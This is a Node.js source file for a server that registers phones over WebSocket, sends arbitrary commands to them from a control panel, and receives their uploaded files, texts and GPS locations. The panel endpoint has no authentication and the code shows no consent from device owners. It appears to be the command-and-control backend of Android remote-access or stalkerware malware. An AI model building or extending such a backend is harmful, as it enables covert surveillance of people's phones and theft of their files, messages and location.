const express = require('express');
const http = require('http');
const path = require('path'); // Import the path module
const webSocket = require('ws');
const uuid4 = require('uuid').v4;
const multer = require('multer');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });

// --- File Storage Configuration ---
// Configure multer to save files to the 'uploads' directory
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: function (req, file, cb) {
        // Prepend timestamp to original filename to prevent overwrites
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

// --- Middleware Setup ---
app.use(express.static('public'));
// Create a static path for the 'uploads' folder to make files viewable
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use(bodyParser.json());

// --- In-Memory Storage ---
const deviceClients = new Map();
let panelClients = new Set();

// --- Helper Functions ---
function broadcastToPanels(data) {
    const message = JSON.stringify(data);
    panelClients.forEach(panelWs => {
        if (panelWs.readyState === webSocket.OPEN) {
            panelWs.send(message);
        }
    });
}

// --- HTTP Routes for Data Upload ---

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// --- ENHANCED /uploadFile Endpoint ---
// This endpoint now saves the file and broadcasts its download path
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving file from ${model || 'unknown device'}`);
    
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }

    // Broadcast a message with the file's name and its new download path
    broadcastToPanels({
        type: 'file_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            filename: req.file.originalname,
            // This path can be used directly in an <a> tag on the frontend
            downloadPath: `/uploads/${req.file.filename}`
        }
    });
    res.status(200).send('File uploaded and saved successfully.');
});

app.post("/uploadText", (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving text from ${model || 'unknown device'}`);
    broadcastToPanels({
        type: 'text_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            text: req.body['text']
        }
    });
    res.status(200).send('Text received.');
});

app.post("/uploadLocation", (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving location from ${model || 'unknown device'}`);
    broadcastToPanels({
        type: 'location_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            lat: req.body['lat'],
            lon: req.body['lon']
        }
    });
    res.status(200).send('Location received.');
});


// --- Main WebSocket Connection Logic (No changes here) ---
wss.on('connection', (ws, req) => {
    const connectionUrl = req.url;

    if (connectionUrl === '/panel') {
        console.log('✅ Control Panel connected.');
        panelClients.add(ws);
        const deviceList = Array.from(deviceClients.values()).map(d => ({...d, ws: undefined}));
        ws.send(JSON.stringify({ type: 'initial_device_list', payload: deviceList }));
        ws.on('message', (message) => {
            try {
                const data = JSON.parse(message);
                if (data.type === 'command') {
                    const { uuid, command } = data.payload;
                    const deviceClient = deviceClients.get(uuid);
                    if (deviceClient && deviceClient.ws.readyState === webSocket.OPEN) {
                        deviceClient.ws.send(command);
                        console.log(`🚀 Sent command '${command}' to ${deviceClient.model}`);
                    }
                }
            } catch (error) {
                console.error('Failed to process message from panel:', error);
            }
        });
        ws.on('close', () => {
            console.log('❌ Control Panel disconnected.');
            panelClients.delete(ws);
        });
        return;
    }

    const uuid = uuid4();
    const { model, battery, version, brightness, provider } = req.headers;
    const deviceInfo = { ws, uuid, model, battery, version, brightness, provider };
    deviceClients.set(uuid, deviceInfo);
    console.log(`📱 Device connected: ${model} | UUID: ${uuid}`);
    const broadcastPayload = { uuid, model, battery, version, brightness, provider };
    broadcastToPanels({ type: 'device_connected', payload: broadcastPayload });
    ws.on('message', (message) => {
        console.log(`[${model}]: ${message}`);
        broadcastToPanels({
            type: 'device_log',
            payload: {
                uuid,
                deviceName: model,
                message: message.toString()
            }
        });
    });
    ws.on('close', () => {
        console.log(`🔌 Device disconnected: ${model} | UUID: ${uuid}`);
        deviceClients.delete(uuid);
        broadcastToPanels({ type: 'device_disconnected', payload: { uuid } });
    });
});

// --- Start the Server ---
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`Server is live and listening on http://localhost:${PORT}`);
});
